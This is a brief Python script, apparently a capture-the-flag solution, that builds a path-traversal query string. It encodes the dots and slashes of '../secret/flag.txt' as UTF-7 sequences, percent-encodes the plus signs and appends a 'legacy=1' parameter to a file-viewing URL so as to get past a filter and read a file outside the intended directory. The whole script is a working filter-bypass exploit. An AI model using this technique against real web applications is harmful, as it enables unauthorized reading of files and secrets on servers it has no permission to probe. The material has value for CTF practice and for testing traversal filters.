# Characters to force-encode: dot and slash
forced_chars = {'.', '/'}

# Path
payload = "../secret/flag.txt"

# Map each forced character to its UTF-7 version
utf7_map = {
    '.': '+AC4-',
    '/': '+AC8-'
}

# Build the encoded string
encoded = ""
for ch in payload:
    if ch in forced_chars:
        encoded += utf7_map[ch]
    else:
        encoded += ch

# Replace + with %2B for the URL
url_safe = encoded.replace('+', '%2B')

# Add the legacy=1 parameter
query = f"REDACTED.com/view?file={url_safe}&legacy=1"

print("Final query string:", query)